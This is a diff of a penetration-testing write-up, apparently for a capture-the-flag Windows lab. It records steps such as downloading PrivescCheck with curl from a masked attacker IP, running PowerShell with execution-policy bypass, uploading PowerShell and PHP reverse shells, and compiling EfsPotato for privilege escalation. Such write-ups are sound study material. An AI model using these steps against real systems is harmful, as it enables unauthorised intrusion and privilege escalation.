@@ -127,7 +127,7 @@ Host script results:
 - Base64 dedcoded it<br>
 - navigated to <code>stealth.com:8080/asdasdadas ... .php</code><br>
 - checked <code>file.ps1</code>´s content<br>
-- identified path <code>xampp</code> > <code>htdocs</code> > <code>uploads</code><br>
+- identified <code>C:\xampp\htdocs\uploads</code><br>
 - deleted its <code>log.txt</code> file considering the message in the web page<br>
 - refreshed the web page<br>
 - uncovered user level flag</p>
@@ -177,7 +177,7 @@ Host script results:
 - navigated to <code>https://github.com/itm4n/PrivescCheck</code><br>
 - downloaded <code>PrivescCheck.ps1</code><br>
 - set up an HTTP server<br>
-- copied <code>PrivescCheck.ps1</code> to the Target<br>
+- copied <code>PrivescCheck.ps1</code> to the Target executing: <code>curl http://xx.xxx.xxx.xx:8000/PrivescCheck.ps1 -o PrivescCheck.ps1</code><br>
 - executed GitHub´s command line: <code>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</code><br>
 - it did not work<br>
 - exited the session</p>
@@ -200,19 +200,12 @@ Host script results:
 - uploaded <code>powershell-reverse-shell.ps1</code> again<br>
 - navigated to <code>C:\xampp\htdocs\uploads</code><br>
 - executed: <code>powershell.exe</code><br>
-- executed: <code>curl http://xx.xxx.xxx.xx:800/PrivescCheck.ps1 -o PrivescCheck.ps1</code><br>
 - executed: <code>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</code.<br>
 - waited ...<br>
-- did not work<br>
-- identified status: <code>Vulnerable - High</code>, Name: <code>Apache 2.4</code>, ImagePath: <code>"C:\xampp\apache\bin\httpdr.exe"</code>, <br>
+- identified status: <code>Vulnerable - High</code>, Name: <code>Apache 2.4</code>, ImagePath: <code>"C:\xampp\apache\bin\httpd.exe"</code><br>
 - searched for <code>GitHub Windows PHP Reverse Shell</code><br>
 - navigated to <code>https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</code><br>
 - downloaded <code>php_reverse_shell.php</code><br>
-
-
-
-https://github.com/zcgonvh/EfsPotato
-Downloaded EfsPotato.cs
 
 <br>
 <br>
@@ -234,6 +227,11 @@ Downloaded EfsPotato.cs
 
 
 <p>Potato</p>
+
+
+https://github.com/zcgonvh/EfsPotato
+Downloaded EfsPotato.cs
+
 
 C:\xampp\htdocs>C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe Potato.cs
 Microsoft (R) Visual C# Compiler version 4.8.3761.0
